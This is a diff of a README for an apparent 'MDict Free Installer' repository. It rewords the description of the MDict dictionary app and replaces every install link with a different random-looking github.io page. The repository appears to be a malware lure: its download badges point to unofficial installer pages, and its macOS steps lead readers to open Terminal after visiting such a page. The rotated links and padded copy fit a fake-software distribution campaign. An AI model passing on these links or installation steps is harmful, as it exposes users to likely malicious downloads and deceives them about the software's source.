@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Dictionary-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 MDict Free Installer** — MDict is a free, cross-platform dictionary viewer for Windows, macOS, iOS, and Android. Works without internet access, no account required. Full offline installation.
+**💻 MDict Free Installer** — MDict is a free dictionary application for Windows, macOS, iOS, and Android that reads the popular MDX/MDD dictionary format. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install MDict](https://img.shields.io/badge/⬇_Install_MDict-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install MDict](https://img.shields.io/badge/⬇_Install_MDict-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About MDict
 
-MDict is a free, cross-platform dictionary viewer for Windows, macOS, iOS, and Android. View offline dictionaries in the MDD and MDX format — a standard for dictionary data popular in China and internationally. With thousands of free MDict-format dictionaries available online covering medical, legal, technical, and bilingual dictionaries, MDict provides access to specialized vocabulary without internet connectivity.
+MDict is a free dictionary application for Windows, macOS, iOS, and Android that reads the popular MDX/MDD dictionary format. It supports offline dictionaries in multiple languages with a clean lookup interface and supports thousands of community-created dictionaries.
 
 ---
 
 ## ❌ Problem: MDict is hard to access
 
-- **Format Specificity** — Only opens MDict format dictionaries; not universal
-- **Dictionary Acquisition** — Quality dictionaries require finding and downloading MDict files separately
-- **Interface Dated** — Visual design less modern on desktop platforms
-- **Documentation** — English documentation sparse for some platform versions
+- **Dictionary Format Specific** — Only reads MDX/MDD format; incompatible with other dictionary formats
+- **Dictionary Acquisition** — Dictionaries must be downloaded separately from community sources
+- **Legal Uncertainty** — Some community dictionary files may contain copyrighted content
+- **Interface Inconsistency** — UI quality varies across platforms
 
 ---
 
@@ -61,9 +61,9 @@ MDict is a free, cross-platform dictionary viewer for Windows, macOS, iOS, and A
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ MDict is a free, cross-platform dictionary viewer for Windows, macOS, iOS, and A
 
 <div align="center">
 
-[![⬇ Install MDict](https://img.shields.io/badge/⬇_Install_MDict-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install MDict](https://img.shields.io/badge/⬇_Install_MDict-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ MDict is a free, cross-platform dictionary viewer for Windows, macOS, iOS, and A
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ MDict is a free, cross-platform dictionary viewer for Windows, macOS, iOS, and A
 
 ---
 
-**MDict Free Installer** — MDict is a free, cross-platform dictionary viewer for Windows, macOS, iOS, and Android. Install without internet connection today!
+**MDict Free Installer** — MDict is a free dictionary application for Windows, macOS, iOS, and Android that reads the popular MDX/MDD dictionary format. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install MDict](https://img.shields.io/badge/⬇_Install_MDict-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install MDict](https://img.shields.io/badge/⬇_Install_MDict-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
